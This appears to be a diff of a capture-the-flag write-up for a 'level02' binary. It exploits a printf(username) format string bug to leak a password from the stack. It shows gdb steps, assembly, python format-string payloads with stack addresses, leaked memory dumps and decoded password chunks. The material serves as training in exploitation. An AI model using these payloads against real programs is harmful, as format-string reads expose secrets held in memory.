@@ -1,5 +1,5 @@
 
-=> To test this binary we need to copy it and modify the file opening 
+=> To test this binary we need to copy it and modify the file opening
 file_pass = fopen("/home/users/level03/.pass", "r"); replace "level03" to "level02"
 
 => We see a potential vulnerabilty at the end of the file with the printf(username)
@@ -7,7 +7,7 @@ file_pass = fopen("/home/users/level03/.pass", "r"); replace "level03" to "level
 
 => The flag is saved in a buffer
 => In the assembly code before the call to fread we can see that buff_flag is at [rbp - 0xa0]
-for exemple before the fread, addr is loaded with LEA 
+for exemple before the fread, addr is loaded with LEA
    0x00000000004008e6 <+210>:	lea    -0xa0(%rbp),%rax
    0x00000000004008ed <+217>:	mov    -0x8(%rbp),%rdx
    0x00000000004008f1 <+221>:	mov    %rdx,%rcx
@@ -17,7 +17,7 @@ for exemple before the fread, addr is loaded with LEA
    0x0000000000400901 <+237>:	callq  0x400690 <fread@plt>
    0x0000000000400906 <+242>:	mov    %eax,-0xc(%rbp)
 
-=> Break just after the fread 
+=> Break just after the fread
 b *0x0000000000400906
 
 => We can then read the buffer
@@ -29,13 +29,13 @@ b *0x0000000000400906
 
 r < <(python -c 'print "\x80\xe5\xff\xff\xff\x7f" +  "%p "*30')
 
-�����0x7fffffffe510 (nil) 0x42 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe708 
-0x1f7ff9a08 0x42424242 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 
-(nil) 0x100000000 (nil) 0x38614e674c427750 0x3735574b544d3870 0x43514156787a3753 
+�����0x7fffffffe510 (nil) 0x42 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe708
+0x1f7ff9a08 0x42424242 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil)
+(nil) 0x100000000 (nil) 0x38614e674c427750 0x3735574b544d3870 0x43514156787a3753
 0x714a385670436e78 0x7642455839735454 (nil) 0x70257fffffffe580 <- our address prefixed by 7025 at the 28th addresses
 
 
-=> Super ! Let's create the format string 
+=> Super ! Let's create the format string
 r < <(python -c 'print "\x80\xe5\xff\xff\xff\x7f" + "%28$s"')
 
 => Problem, We have a SEGFAULT ! It's because on the stack, the address is prefixed by 3225 (%2)
@@ -45,22 +45,48 @@ x/50gx $rsp (display value 8 bytes)
 ...
 
 => Our address is 8 bytes long on 64 bits system, and we writed 6 on the 8 bytes
-=> We can't add null bytes (\x00) like: "\x60\xe4\xff\xff\xff\x7f\x00\x00" + "%28$s" 
-because printf will stop and ignore the rest of the payload 
+=> We can't add null bytes (\x00) like: "\x60\xe4\xff\xff\xff\x7f\x00\x00" + "%28$s"
+because printf will stop and ignore the rest of the payload
 
 => Let's put the put the address at the end then and add 1 to the offset
 r < <(python -c 'print "%00029$s" + "\x80\xe5\xff\xff\xff\x7f"')
 
-=> This time we can see that is no more prefixed, we have only 0 in the stack 
+=> This time we can see that is no more prefixed, we have only 0 in the stack
 0x7fffffffe5b0:	0x7324393230303025	0x00007fffffffe580
 0x7fffffffe5c0:	0x0000000000000000	0x0000000000000000
 
-=> The address is misaligned we need to add 3 characters 
+=> The address is misaligned we need to add 3 characters
 python -c 'print "%00029$s" + "\x80\xe5\xff\xff\xff\x7f"'
 
-=> We have a difference outside gdb, we tests differents values and we found 
--> patch binary 
+=> We have a difference outside gdb, we tests differents values and we found
+-> patch binary
 (python -c 'print "%00029$s" + "\x70\xe5\xff\xff\xff\x7f"') | ./level02
 
--> real binary 
+-> real binary
 (python -c 'print "%00029$s" + "\x40\xe5\xff\xff\xff\x7f"') | ~/level02
+
+-----------------------------------------------------------------------------------
+
+1. Vulnerability
+
+	- The function printf(username) is vulnerable to a format string attack because it directly uses the username variable
+	as the format string without any validation or sanitization.
+	- This vulnerability allows attackers to read (or potentially write) arbitrary memory by manipulating the input
+	with format specifiers like %p, %x, etc.
+
+2. Exploit
+
+	```python
+	python -c 'print("%p "*30)' | ./level02
+	python -c 'print("\x50\xe5\xff\xff\xff\x7f" + "%p " * 28 + "\n")' | ./level02
+	```
+
+3. Decode the password
+
+	```
+	0x756e505234376848 -> Hh74RPnu
+	0x45414a3561733951 -> Q9sa5JA5
+	0x377a7143574e6758 -> XgNWCqz7
+	0x354a35686e475873 -> sXGnh5J5
+	0x48336750664b394d -> M9KfPg3H
+	```
